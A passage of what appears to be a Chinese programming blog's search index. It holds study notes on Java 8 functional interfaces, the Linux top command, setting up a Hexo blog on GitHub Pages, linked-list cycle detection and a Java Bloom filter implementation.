? extends V&gt; after) &#123;        Objects.requireNonNull(after);        return (T t) -&gt; after.apply(apply(t));    &#125;    /**     * Returns a function that always returns its input argument.     */    static &lt;T&gt; Function&lt;T, T&gt; identity() &#123;        return t -&gt; t;    &#125;&#125;\n\npackage java.util.function;import java.util.Objects;/** * Represents an operation that accepts a single input argument and returns no * result. Unlike most other functional interfaces, &#123;@code Consumer&#125; is expected * to operate via side-effects. */@FunctionalInterfacepublic interface Consumer&lt;T&gt; &#123;    /**     * Performs this operation on the given argument.     */    void accept(T t);    /**     * Returns a composed &#123;@code Consumer&#125; that performs, in sequence, this     * operation followed by the &#123;@code after&#125; operation. If performing either     * operation throws an exception, it is relayed to the caller of the     * composed operation.  If performing this operation throws an exception,     * the &#123;@code after&#125; operation will not be performed.     */    default Consumer&lt;T&gt; andThen(Consumer&lt;? super T&gt; after) &#123;        Objects.requireNonNull(after);        return (T t) -&gt; &#123; accept(t); after.accept(t); &#125;;    &#125;&#125;\n\npackage java.util.function;/** * Represents a supplier of results. */@FunctionalInterfacepublic interface Supplier&lt;T&gt; &#123;    /**     * Gets a result.     */    T get();&#125;\n\npackage java.util.function;import java.util.Objects;/** * Represents a predicate (boolean-valued function) of one argument. */@FunctionalInterfacepublic interface Predicate&lt;T&gt; &#123;    /**     * Evaluates this predicate on the given argument.     */    boolean test(T t);    /**     * Returns a composed predicate that represents a short-circuiting logical     * AND of this predicate and another.  When evaluating the composed     * predicate, if this predicate is &#123;@code false&#125;, then the &#123;@code other&#125;     * predicate is not evaluated.     */    default Predicate&lt;T&gt; and(Predicate&lt;? super T&gt; other) &#123;        Objects.requireNonNull(other);        return (t) -&gt; test(t) &amp;&amp; other.test(t);    &#125;    /**     * Returns a predicate that represents the logical negation of this     * predicate.     */    default Predicate&lt;T&gt; negate() &#123;        return (t) -&gt; !test(t);    &#125;    /**     * Returns a composed predicate that represents a short-circuiting logical     * OR of this predicate and another.  When evaluating the composed     * predicate, if this predicate is &#123;@code true&#125;, then the &#123;@code other&#125;     * predicate is not evaluated.     */    default Predicate&lt;T&gt; or(Predicate&lt;? super T&gt; other) &#123;        Objects.requireNonNull(other);        return (t) -&gt; test(t) || other.test(t);    &#125;    /**     * Returns a predicate that tests if two arguments are equal according     * to &#123;@link Objects#equals(Object, Object)&#125;.     */    static &lt;T&gt; Predicate&lt;T&gt; isEqual(Object targetRef) &#123;        return (null == targetRef)                ? Objects::isNull                : object -&gt; targetRef.equals(object);    &#125;&#125;\n\n关于它们默认方法的使用，这里也举一个小例子来说明。关于 FUnction&lt;T, R&gt; 默认方法 compose 和 andThen 的使用：\npublic class Main &#123;    public static void main(String[] args) &#123;        // 使用 lambda 定义 Function 的实现        Function&lt;String, String&gt; f1 = s -&gt; s.toUpperCase();        Function&lt;String, String&gt; f2 = s -&gt; s + &quot; world&quot;;        // f1 执行之前 执行 f2         // HELLO WORLD        String res1 = f1.compose(f2).apply(&quot;hello&quot;);        // f1 执行之后 执行 f2          // HELLO world        String res2 = f1.andThen(f2).apply(&quot;hello&quot;);        System.out.println(res1);        System.out.println(res2);    &#125;&#125;\n\n由于这些默认函数的返回值是接口本身，所以可以很愉快的进行链式调用。\n关于 stream 流 以及总结得益于 Lambda 的引入，让 Java 8 中的流式操作成为可能，Java 8 提供了 stream 类用于获取数据流，它专注对数据集合进行各种高效便利操作，提高了编程效率，且同时支持串行和并行的两种模式汇聚计算。能充分的利用多核优势。\n流式操作很爽，流式操作一切从这里开始。\n// 为集合创建串行流stream()// 为集合创建并行流parallelStream()\n\nstream 流应该是重点，且看下回。lambda 主要是将函数作为参数和返回值。将计算的过程抽象为一个函数，可以将这个函数作用于其他的数据，也可以让其他函数返回一个函数。这里写的比较抽象，还是在自己写的时候更容易理解，多写吧。\n这篇个人感觉写的不是很好，有些乱了。因为从 Optional 看到 lambda 再到 stream，想去翻翻源码，然后越看越乱。发现 stream 流创建时，还分为并行流和串行流。和多线程有关的没一个简单的啊决定先整理一点，缓一缓。\n其他参考函数式编程-入门篇章函数式编程之惰性求值函数式编程的核心思想Java高级特性—-函数式编程的使用Java 8 函数式接口\nLambda表达式和匿名内部类的区别Java 8 Lambda 表达式介绍Java Lambda 表达式Java8新特性 Lambda底层实现原理Java8系列 (一) Lambda表达式快速看清lambda的本质\n","categories":["学习笔记"],"tags":["java","lambda","函数式编程"]},{"title":"top命令","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/top%E5%91%BD%E4%BB%A4/","content":"top 命令top 命令是 Linux 常用的实时系统监控工具。它默认每隔 3 秒刷新一次。\n启动参数（命令行选项）\n\n\n参数\n全称\n作用\n\n\n\n-d seconds\ndelay-time\n刷新间隔（默认 3 秒），例如 top -d 1 每 1 秒刷新一次\n\n\n-n count\nnumber-of-iterations\n运行多少次后退出，例如 top -n 5 显示 5 次后退出\n\n\n-p pid\nprocess-id\n仅监控指定进程，例如 top -p 1234\n\n\n-u user\nuser-name\n仅显示指定用户的进程，例如 top -u root\n\n\n-U user\nUID-based\n类似 -u，但基于 UID\n\n\n-b\nbatch-mode\n批处理模式（无交互，常用于重定向到文件：top -b -n 1 &gt; out.txt）\n\n\n-H\nthreads-mode\n显示线程而非进程\n\n\n-i\nidle-process toggle\n启动时忽略空闲任务（&#x3D; 运行时按 i）\n\n\n-c\ncommand-line toggle\n显示完整命令行（&#x3D; 运行时按 c）\n\n\n交互式快捷键（运行时输入）显示控制\n\n\n按键\n全称\n作用\n\n\n\nh\nhelp\n显示帮助（所有快捷键说明）\n\n\nq\nquit\n退出 top\n\n\nz\ncolor&#x2F;mono toggle\n切换彩色&#x2F;单色模式\n\n\nB\nbold toggle\n是否加粗高亮\n\n\nl\nload-average toggle\n显示&#x2F;隐藏顶部的负载信息\n\n\nt\ntasks toggle\n显示&#x2F;隐藏任务和 CPU 使用情况\n\n\nm\nmemory toggle\n显示&#x2F;隐藏内存&#x2F;Swap 行\n\n\n1\ncpu-per-core\n展开&#x2F;收起所有 CPU 核心的使用率\n\n\n\n排序与过滤\n\n\n按键\n全称\n作用\n\n\n\nP\nsort by CPU\n按 CPU 使用率排序（默认）\n\n\nM\nsort by Memory\n按内存使用率排序\n\n\nT\nsort by Time\n按运行时间排序\n\n\nN\nsort by PID\n按 PID 排序\n\n\nR\nreverse sort\n反向排序\n\n\nO（大写）\nchange sort field\n按其他字段排序（进入交互菜单选择）\n\n\no（小写）\nfilter by field\n过滤显示（例如 COMMAND=nginx）\n\n\nu\nfilter by user\n只显示某个用户的进程\n\n\n\n进程控制\n\n\n按键\n全称\n作用\n\n\n\nk\nkill\n杀死进程（输入 PID 和信号，默认 15 SIGTERM）\n\n\nr\nrenice\n调整进程 Nice 值（输入 PID 和新 nice 值）\n\n\ns\nset-delay\n修改刷新间隔（秒）\n\n\nW\nwrite config\n保存当前配置，下次启动生效（写入 ~/.toprc）\n\n\n\n进程显示切换\n\n\n按键\n全称\n作用\n\n\n\nc\ncommand-line toggle\n显示完整命令行 vs 仅命令名\n\n\ni\nidle toggle\n显示&#x2F;隐藏空闲进程\n\n\nH\nthreads toggle\n显示线程而不是进程\n\n\nx\nhighlight sort column\n高亮当前排序列\n\n\ny\nhighlight running tasks\n高亮正在运行的任务\n\n\nu\nuser filter\n只显示指定用户的进程\n\n\nV\nforest view\n树状显示进程（类似 pstree）\n\n\n显示信息top - 13:24:16 up 3 days, 22:41,  0 user,  load average: 0.14, 0.14, 0.11Tasks: 163 total,   1 running, 162 sleeping,   0 stopped,   0 zombie%Cpu(s):  1.3 us,  0.8 sy,  0.0 ni, 97.1 id,  0.7 wa,  0.0 hi,  0.1 si,  0.0 st MiB Mem :   7940.7 total,    222.3 free,   6399.8 used,   1590.8 buff/cache     MiB Swap:      0.0 total,      0.0 free,      0.0 used.   1540.9 avail Mem   PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                                                                     1197 root      20   0 1963420 640468  36736 S   4.0   7.9 282:35.87 kube-apiserver                                                                              2327 root      20   0 2237824  49708  24064 S   1.3   0.6  80:30.91 calico-node                                                                                  771 root       0 -20   11.3g  89348  23552 S   1.0   1.1  79:04.21 etcd                                                                                        1228 root      20   0 1412044  84508  21376 S   1.0   1.0  78:41.97 kube-controller                                                                            32616 root      20   0 2227064  92080  50560 S   1.0   1.1  79:00.74 kubelet                                                                                     1212 root      20   0 1283348  32972  13056 S   0.3   0.4  15:25.14 kube-scheduler                                                                              1648 root      20   0  746604  16832   6400 S   0.3   0.2   9:40.87 node-cache                                                                                 15415 root      20   0       0      0      0 I   0.3   0.0   0:00.28 kworker/1:1-events                                                                         31742 root      20   0 2398412  60844  29696 S   0.3   0.7  26:17.82 containerd                                                                                 43556 ubuntu    20   0   13228   6528   4352 R   0.3   0.1   0:00.18 top                                                                                            1 root      20   0   23084  12288   7680 S   0.0   0.2   1:12.93 systemd                                                                                        2 root      20   0       0      0      0 S   0.0   0.0   0:00.05 kthreadd                                                                                       3 root      20   0       0      0      0 S   0.0   0.0   0:00.00 pool_workqueue_release                                                                         4 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/R-rcu_g                                                                                5 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/R-rcu_p                                                                                6 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/R-slub_                                                                                7 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/R-netns                                                                                9 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/0:0H-events_highpri                                                                   12 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/R-mm_pe                                                                               13 root      20   0       0      0      0 I   0.0   0.0   0:00.00 rcu_tasks_kthread                                                                             14 root      20   0       0      0      0 I   0.0   0.0   0:00.00 rcu_tasks_rude_kthread                                                                        15 root      20   0       0      0      0 I   0.0   0.0   0:00.00 rcu_tasks_trace_kthread                                                                       16 root      20   0       0      0      0 S   0.0   0.0   0:13.07 ksoftirqd/0                                                                                   17 root      20   0       0      0      0 I   0.0   0.0   1:02.67 rcu_preempt                                                                                   18 root      rt   0       0      0      0 S   0.0   0.0   0:02.89 migration/0                                                                                   19 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 idle_inject/0                                                                                 20 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/0                                                                                       21 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/2                                                                                       22 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 idle_inject/2                                                                                 23 root      rt   0       0      0      0 S   0.0   0.0   0:02.40 migration/2     \n\n顶部状态top - 13:24:16 up 3 days, 22:41,  0 user,  load average: 0.14, 0.14, 0.11\n\n\n13:24:16 → 当前系统时间\nup 3 days, 22:41 → 系统已运行 3 天 22 小时 41 分钟\n0 user → 当前登录用户数（这里没有用户直接登录）\nload average: 0.14, 0.14, 0.11 系统 1 分钟、5 分钟、15 分钟的平均负载。数字越接近 CPU 核心数，说明负载越合理。比如 4 核 CPU，load average 小于 4 基本健康。\n\nTasks: 163 total,   1 running, 162 sleeping,   0 stopped,   0 zombie\n\n\n163 total → 系统中共有 163 个进程\n1 running → 正在运行的进程 1 个\n162 sleeping → 休眠状态的进程 162 个（大部分进程常处于此状态，等待事件触发）\n0 stopped → 停止的进程（通过信号暂停）\n0 zombie → 僵尸进程（子进程结束但父进程未回收资源，数量多时是问题信号）\n\n%Cpu(s):  1.3 us,  0.8 sy,  0.0 ni, 97.1 id,  0.7 wa,  0.0 hi,  0.1 si,  0.0 st\n\n\n1.3 us (user space) → 用户态进程占用 CPU 1.3%\n0.8 sy (system) → 内核态占用 CPU 0.8%\n0.0 ni (nice) → 调整过 nice 优先级的进程占用 0%\n97.1 id (idle) → CPU 空闲 97.1%\n0.7 wa (I&#x2F;O wait) → 等待 I&#x2F;O 的 CPU 时间（磁盘&#x2F;网络）\n0.0 hi (hardware interrupt) → 硬件中断占用 CPU 时间百分比\n0.1 si (software interrupt) → 软件中断占用 CPU 时间百分比\n0.0 st (steal time) → 被虚拟机管理程序（Hypervisor）“偷走”的 CPU 时间百分比（虚拟化场景有意义）\n\n\n一般关注 us+sy（实际负载），如果 wa 很高，说明 I&#x2F;O 瓶颈。\n\nMiB Mem :   7940.7 total,    222.3 free,   6399.8 used,   1590.8 buff/cache\n\n\n7940.7 total → 总内存 7.9 GB\n222.3 free → 空闲内存 222 MB（未使用部分，Linux 下通常较小）\n6399.8 used → 被程序使用的内存 6.4 GB（包含应用+缓存）\n1590.8 buff&#x2F;cache → 缓冲和缓存内存（用于磁盘缓存和文件缓存，可回收）\n\nMiB Swap:      0.0 total,      0.0 free,      0.0 used.   1540.9 avail Mem\n\n\ntotal 0.0 → 没有配置 swap 分区\nfree 0.0 → 空闲 Swap\nused 0.0 → 已用 Swap\navail Mem 1540.9 → 实际可用内存 1.5 GB（考虑缓存和可回收内存），比 free 更准确\n\n\n如果 Swap used 很高，说明物理内存不足。\n\n进程列表PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND \n\n\nPID (Process ID) → 进程 ID（唯一标识）\nUSER → 进程所有者（用户名）\nPR (Priority) → （内核调度的优先级，数值越小优先级越高）\nNI (Nice) → nice 值（用户可调节，-20 ~ 19，影响优先级）\nVIRT (Virtual Memory) → 进程使用的虚拟内存 (KB)，进程申请的总地址空间，包括共享库、映射文件等\nRES (Resident Memory) → 进程常驻物理内存 (KB)，实际占用的物理内存\nSHR (Shared Memory) → 共享内存 (KB)，与其他进程共享的内存\nS (State) → 进程状态\nR → running\nS → sleeping\nI → idle\nD → 不可中断睡眠\nZ → 僵尸\n\n\n%CPU (CPU usage) → CPU 使用率（按刷新周期计算）\n%MEM (Memory usage) → 内存使用率（占总内存百分比）\nTIME+ (CPU Time) → 进程累计使用的 CPU 时间，格式 分钟:秒.百分秒\nCOMMAND → 进程的命令或程序名（默认显示简写，可按 c 显示完整命令行）\n\n一些指标的概念Nice 值 (Niceness Value)调节进程的优先级 (Priority, PR)，影响 CPU 调度的先后顺序。\n\n取值范围：-20 ~ 19\n\n-20 → 最高优先级（最“自私”，会多抢占 CPU）\n0 → 默认值\n19 → 最低优先级（最“友好”，让出 CPU 机会）\n\n\n关系：\n\n最终调度优先级由 PR &#x3D; base_priority + NI 决定\ntop 里 PR 越小，进程调度优先级越高\n\n\n修改方式：\n\n启动时指定：nice -n 10 my_program\n运行时调整：renice -n -5 -p 1234 （调整 PID&#x3D;1234 的进程）\n\n\n大型数据分析进程可以 nice=10 → 不阻塞关键服务\n\n系统关键进程可能会设置低 nice 值（-5 ~ -20），保证调度优先级\n\n\n\n交换空间 (Swap Space)当物理内存不足时，Linux 会把部分不常用的内存页写到磁盘上的 Swap 区域，以释放 RAM。可以让系统避免“内存不足直接崩溃”。但磁盘速度远低于内存，频繁使用 Swap 会导致性能下降（俗称“抖动 &#x2F; thrashing”）。\n\n在 top 的 Swap used 升高时，说明内存吃紧\n进程会明显变慢\n\nKubernetes 中默认不允许使用交换内存\nKubernetes 的调度和资源控制主要依赖于 cgroup 的 CPU、内存限制。\n\n内存限制：Pod 被限制多少内存，超过就会触发 OOMKill。\n如果允许 swap，那么：\nPod 占用的物理内存可能被换出到 swap，而 kubelet 和 cgroup 并不知道。\n容器可能“假装”没超内存，实际上性能已经变得非常差。\n这会导致 资源隔离失真，调度器也无法准确分配资源。\n\n\n\n因此，Kubernetes 默认要求节点运行在 no swap 的状态下，以保证资源控制的可预测性。\n但 Kubernetes 在后续版本有支持开启交换内存的功能：\nNew in Kubernetes v1.22: alpha support for using swap memoryKubernetes 1.28: Beta support for using swap on Linux\n虚拟内存 (Virtual Memory, VIRT)每个进程拥有独立的地址空间（虚拟内存），由操作系统内核管理并映射到实际物理内存或磁盘。\n包含内容：\n\n程序代码\n已分配但未实际使用的内存\n动态库\n内存映射文件（mmap）\n可能被换出到 Swap 的部分\n\n指标含义：\n\ntop 里的 VIRT → 进程可寻址的虚拟内存总量（不等于真实占用 RAM）\nRES → 真实常驻物理内存\nSHR → 共享内存\n\n举例：一个 Python 程序加载 TensorFlow，VIRT 可能几十 GB，但 RES 可能只有几百 MB，因为很多库只是映射，并没有真正加载到内存。\n中断 (Interrupt)中断是 CPU 在运行用户代码时，被“打断”去处理某个事件的机制。分为硬件中断和软件中断。\n硬件中断 (Hardware Interrupt, hi)来源：外部硬件设备向 CPU 发出信号例子：\n\n键盘输入（按下一个键）\n网络接口卡收到数据包\n磁盘 I&#x2F;O 完成通知\n\n类比：你正在写字（运行程序），突然电话响了（键盘输入），你必须停下去接电话（处理硬件中断）。\n软件中断 (Software Interrupt, si)来源：内核为处理高频硬件事件，把一些工作转交给“软中断”机制（通常由内核线程完成）。例子：\n\n网络包的协议栈处理（TCP&#x2F;IP 解析）\n大量磁盘 IO 的后续处理\n\n类比：电话太多了，你雇了秘书（内核线程）来代接一部分，这就是软件中断。\n","categories":["学习笔记"],"tags":["linux"]},{"title":"使用hexo框架在github.io上搭建博客网站.","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8hexo%E6%A1%86%E6%9E%B6%E5%9C%A8github-io%E4%B8%8A%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/","content":"安装相关软件安装gitGit是一个开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理。也是Linus Torvalds为了帮助管理Linux内核开发而开发的一个开放源码的版本控制软件。据说他开发git只花了两周时间，大佬不愧是大佬。git官网windows：到git官网上下载，下载后会有一个Git Bash的命令行工具，用这个工具就可以使用git了。linux：因为开发git就是为了管理linux内核开发的，所以linux的非常简单，只需要下面这行代码\nsudo apt-get install git\n当然你像我一样使用IDE自动安装安装完成后，可以使用git --version查看版本\n安装nodejs因为Hexo是基于nodeJS编写的，所以需要安装一下nodejs和里面的npm工具。windows：到nodejs下载地址，选择LTS版本（稳定版本）就行了。linux：使用以下命令\nsudo apt-get install nodejssudo apt-get install npm\n安装完后，使用node -v 和 npm -v 查看版本\n安装hexo可以参考官方文档，真的非常好用所有必备的应用程序（git和nodejs）安装完成后，即可使用 npm 安装 Hexo。全局安装\nnpm install -g hexo-cli\n\n关于github pages可以参考官方文档\n创建github仓库新建一个名字为username.github.io的仓库仓库名必须为username.github.io，否则不会被github识别。其中username为github账户的用户名。\n生成ssh添加到github（如果之前没有添加过的话）在git bash中，配置账户信息\ngit config --global user.name &quot;yourname&quot;git config --global user.email &quot;youremail&quot;\n这里的yourname为GitHub用户名，youremail为GitHub的邮箱。不要瞎写，不然无法push到github\n可以查看配置的信息。以防写错\ngit config user.namegit config user.email\n然后创建SSH，一路回车。\nssh-keygen -t rsa -C &quot;youremail&quot;\n创建完成后，会生成C:\\Users\\Username.ssh文件夹其中id_rsa是生成的私钥，id_rsa.pub是生成的公钥。将id_rsa.pub用记事本打开，复制其内容，添加到github的设置中。添加完成后，在gitbash中查看是否添加成功\nssh -T git@github.com\n成功会有 Hi username&#x2F;username.github.io! You’ve successfully authenticated, but GitHub does not provide shell access. 这句话。\n关于hexohexo的初始化前面给的官方文档也包含了hexo的配置，以及命令等其他相关的功能。 所以这里就简单写一下。执行下列命令，Hexo将会在当前目录的指定文件夹中新建所需要的文件，请确保指定文件夹为空。\nhexo init &lt;folder&gt;cd &lt;folder&gt;npm install\n新建完成后，指定文件夹下会生成一些文件，其中：_config.yml——hexo的配置文件package.json——应用程序信息scaffolds——模板文件夹，创建文章时，会根据模板来创建source——资源文件夹，写的markdown和图片资源什么的都在这themes——主题文件夹，比如我在使用的butterfly主题就放在这\n将hexo部署到GitHub将hexo生成的文章部署到GitHub上打开hexo配置文件 _config.yml，翻到最后，修改deploy其中YourgithubName是你的GitHub账户，branch是分支，一般设置为main或者master\ndeploy:    type: git    repo: https://github.com/YourgithubName/YourgithubName.github.io.git    branch: master\n修改完后，需要先安装deploy-git（部署的命令），这样才能用命令部署到GitHub。\nnpm install hexo-deployer-git --save\n之后是hexo的部署命令\nhexo cleanhexo generatehexo deploy\n其中 hexo clean 清除了你之前生成的东西。hexo generate 生成静态文章，可以用 hexo g缩写hexo deploy 部署文章，可以用hexo d缩写hexo generate 和 hexo deploy 也可以合并写成 hexo g -d 或者 hexo d -g\n出现 INFO  Deploy done: git 时，说明部署成功了。稍微等一会，便可以在 https://yourname.github.io 这个网站看到你的博客了，其中yourname是github的用户名。刷新显示404，请不要着急。心急吃不了热豆腐\n到这里，使用hexo在github.io上搭建博客网站就成功了。就可以开始写博客了。但，是不是有点单调。所以我们可以使用主题来装饰他，来实现更多的功能。 github官方建议你使用博客生成工具 Jekyll。\n关于hexo的主题butterfly可以参考官方安装文档\n安装butterfly在hexo的根目录里github：\ngit clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly\ngitee：\ngit clone -b master https://gitee.com/immyw/hexo-theme-butterfly.git themes/butterfly\n应用主题修改 Hexo 根目录下的 _config.yml，把主题改为butterfly\ntheme: butterfly\n安裝插件如果你沒有 pug 以及 stylus 的渲染器，請下載安裝：\nnpm install hexo-renderer-pug hexo-renderer-stylus --save\nbutterfly的相关配置相关配置请看文档，有详细的解释。在此不作赘述。\n可能会产生的错误错误的原因可能很多，解决方法并不一定有用。在这里列出我碰到的问题。因为github连接不稳定，所以要有耐心。\nOpenSSL SSL_read: Connection was aborted, errno 10053原因Git默认限制推送的大小，运行命令更改限制大小解决方法\ngit config --global http.postBuffer 524288000\nFailed to connect to github.com port 443: Timed out原因代理的设置问题解决方法：进入项目目录中，使用命令行取消代理设置：\ngit config --global --unset http.proxygit config --global --unset https.proxy","categories":["学习笔记"],"tags":["hexo"]},{"title":"单链表环问题","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%8E%AF%E9%97%AE%E9%A2%98/","content":"题目和前置给出一个单链表，判断是否有环。如果有环，则返回环入口和环长度。\n单链表节点结构\npackage LinkedList;public class Node &#123;    public Integer data;    public Node next;    public Node() &#123;        this.data = null;        this.next = null;    &#125;    public Node(int value) &#123;        this.data = value;        this.next = null;    &#125;&#125;\n\n随机环链表的对数器\n/** * 生成环链表（入口随机） * @return 返回链表头节点 */private Node getRingLinkedList()&#123;    Node head = new Node();    Node next = head;    Random random = new Random();    int rand = random.nextInt(100);    Node r = null;    for (int i = 0; i &lt; 100; i++) &#123;        next.next = new Node(random.nextInt(50));        next = next.next;        if (i == rand) &#123;            r = next;        &#125;    &#125;    next.next = r;    System.out.println(&quot;环入口：&quot;+r);    System.out.println(&quot;环入口数据：&quot;+r.data);    return head;&#125;\n\n使用辅助空间的解法使用辅助空间存储节点地址，如果有重复的，则第一次出现重复的即为环的入口环长度为重复元素出现位置的差\n时间复杂度为 O(n)空间复杂度也为 O(n)\n代码实现：\n/** * 判断一个链表是否有环，并返回环的入口 * 使用 List集合 存储节点，第一次出现重复节点即为环的入口 */public static Node findLoopPort1(Node head) &#123;    Node next = head.next;    List&lt;Node&gt; list = new ArrayList&lt;Node&gt;();    while (null != next) &#123;        for (int i = 0; i &lt; list.size(); i++) &#123;            if (list.get(i) == next) &#123;                System.out.println(&quot;环的长度：&quot; + (list.size() - i));                return next;            &#125;        &#125;        list.add(next);        next = next.next;    &#125;    return null;&#125;\n\n使用快慢指针的解法设置快慢指针，慢指针每次走一步，快指针每次走两步。有两个结论：\n\n如果链表有环，则他们一定会在环中相遇\n相遇后，让两个指针分别从表头和相遇点出发，每次走一步，最后一定会在环入口相遇\n\n证明1：首先快指针比慢指针走得快，所以当慢指针进入环中时，快指针一定在环中。这时，相当于快指针在追慢指针。在慢指针走一圈之内一定会追上。\n证明2：表头到环入口长度为 a环入口到相遇点长度为 b相遇点到环入口长度为 c\n\n快慢指针都从表头出发，到在相遇点相遇时：慢指针路程为 a + b快指针路程为 a + (b + c) * k + b 其中 (b+c) 是环长度，k是环的圈数。k&gt;&#x3D;1快指针路程是慢指针的两倍： a + (b + c) * k + b = 2 * (a + b)\n化简可以得到 a = (k - 1)(b + c) + c他的意思是：表头到环入口的距离 &#x3D; 相遇点到环入口的距离 + (k - 1)圈环长度所以两指针分别从表头和相遇点出发，最后会在环入口相遇。\n环长度可以让一指针从相遇点出发，另一指针在原地等。第一次相遇所走过的长度即为环长度\n时间复杂度为 O(n)空间复杂度为 O(1)\n代码实现：\n/** * 判断一个链表是否有环，并返回环的入口 * 使用快慢指针实现 */public static Node findLoopPort2(Node head) &#123;    Node p1 = head.next;    Node p2 = head.next;    while (p1.next != null &amp;&amp; p2.next != null) &#123;        p1 = p1.next;        p2 = p2.next.next;        // 有环，会在环中某节点相遇        if (p1 == p2) &#123;            break;        &#125;    &#125;    // 无环 返回null    if (p1.next == null || p2.next.next == null) &#123;        return null;    &#125;    // 有环，计算环长度    int count = 1;    p1 = p1.next;    while (p1 != p2) &#123;        p1 = p1.next;        count++;    &#125;    // 有环，两指针分别从起点和相遇点触发，最后会在环入口相遇    p1 = head.next;    while (p1 != p2) &#123;        p1 = p1.next;        p2 = p2.next;    &#125;    System.out.println(&quot;环的长度：&quot; + count);    return p1;&#125;\n\n参考：链表中环的入口节点 膜拜大佬！\n","categories":["学习笔记"],"tags":["java","算法","链表","环"]},{"title":"布隆过滤器","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8/","content":"介绍布隆过滤器（Bloom Filter）是1970年由布隆提出的。它实际上是一个很长的二进制向量和一系列随机映射函数。布隆过滤器可以用于检索一个元素是否在一个集合中。它类似一个hash set，用来判断某个元素（key）是否在某个集合中。但和一般的hash set不同的是，这个算法无需存储key的值，对于每个key，只需要k个比特位，每个存储一个标志，用来判断key是否在集合中。它的优点是空间效率和查询时间都比一般的算法要好的多。缺点是有一定的误识别率、无法获取元素本身和删除困难。\n他的使用场景：布隆过滤器可以告诉我们“某个东西一定不存在或可能存在”。即布隆过滤器说不存在即一定不存在，说存在可能不存在（误判）\n\n邮件过滤，使用布隆过滤器来做邮件黑名单过滤\n对爬虫网址进行过滤，爬过的不再爬\n解决新闻推荐过的不再推荐总的来说，即用于黑名单过滤\n\n原理哈希函数哈希函数的概念是：将任意大小的输入数据转换成特定大小的输出数据的函数，转换后的数据称为哈希值或哈希编码，也叫散列值。所有散列函数都有如下基本特性：\n\n如果两个散列值是不相同的（根据同一函数），那么这两个散列值的原始输入也是不相同的。这个特性是散列函数具有确定性的结果，具有这种性质的散列函数称为单向散列函数。\n散列函数的输入和输出不是唯一对应关系的，如果两个散列值相同，两个输入值很可能是相同的，但也可能不同，这种情况称为“散列碰撞（collision，哈希碰撞）”。但是用 hash表存储大数据量时，空间效率还是很低，当只有一个 hash 函数时，还很容易发生哈希碰撞。\n\n布隆过滤器数据结构布隆过滤器由一个固定大小的二进制向量或位图（bitmap）和一系列映射函数组成。在初始状态下，对于长度为m的位数组，他所有位置都被置为0。如下图：\n当有元素被加入集合时，通过k个映射函数将这个元素映射成位图中的k个点，将它们的值置为1。假如有两个元素通过三个映射函数，如下图：\n当查询某个元素是都存在时，只要通过k个映射函数，看对应位图中的k个点的值是否都为1。\n\n如果这些点有任意一个为0，则元素一定不存在。\n如果都是1，则元素可能存在。为什么是可能存在，不是一定存在。是因为映射函数本身是散列函数，散列函数会有碰撞（即使碰撞概率可以很低）。\n\n误判率布隆过滤器的误判是指多个输入经过哈希之后在相同的bit位 置1 了，这样就无法判断究竟是哪个输入产生的，因此误判的根源在于相同的bit位被多次映射且置1。这种情况也造成了布隆过滤器的删除问题，因为布隆过滤器的每一个bit并不是独占的，很有可能多个元素共享了某一位。如果我们直接删除这一位的话，会影响其他的元素。（比如上图中的第3位）\n**布隆过滤器可以添加元素，但不能删除元素。**因为删除元素会导致误判率的增加。\n关于误判率的计算（略）参考布隆过滤器概念及其公式推导 转载其中可以根据 样本量和期望的失误率 得出具体需要 多少存储空间和哈希函数的个数布隆过滤器只与样本量和失误率有关，与单样本大小无关（因为它会经过哈希函数）\n布隆过滤器的实现codingpackage BloomFilter;import java.util.BitSet;/** * 布隆过滤器 */public class BloomFilter &#123;    // 长度为10亿的比特位    private static final int DEFAULT_SIZE = 256 &lt;&lt; 22;    // 使用的哈希函数（8个）    private static final int[] seeds = &#123;3, 5, 7, 11, 13, 17, 19, 23&#125;;    private static final HashFunction[] functions = new HashFunction[seeds.length];    // 初始化布隆过滤器    private static BitSet bitSet = new BitSet(DEFAULT_SIZE);    /**     * 构造函数，初始化哈希函数     */    public BloomFilter() &#123;        for (int i = 0; i &lt; seeds.length; i++) &#123;            functions[i] = new HashFunction(DEFAULT_SIZE,seeds[i]);        &#125;    &#125;    /**     * 添加元素     */    public void add(String value)&#123;        if (value!=null)&#123;            for(HashFunction f : functions)&#123;                bitSet.set(f.hash(value),true);            &#125;        &#125;    &#125;    /**     * 判断元素是否存在     */    public boolean contains(String value)&#123;        if (value==null)&#123;            return false;        &#125;        boolean result = true;        // 遍历所有哈希结果对应比特位，有一个返回false即break（不存在）        for(HashFunction f :functions)&#123;            result = bitSet.get(f.hash(value));            if (!result)&#123;                break;            &#125;        &#125;        return result;    &#125;&#125;/** * 哈希函数 */class HashFunction &#123;    private final int size;    private final int seed;    public HashFunction(int size, int seed) &#123;        this.size = size;        this.seed = seed;    &#125;    /**     * 使用加法哈希算法     */    public int hash(String value) &#123;        int result = 0;        int len = value.length();        for (int i = 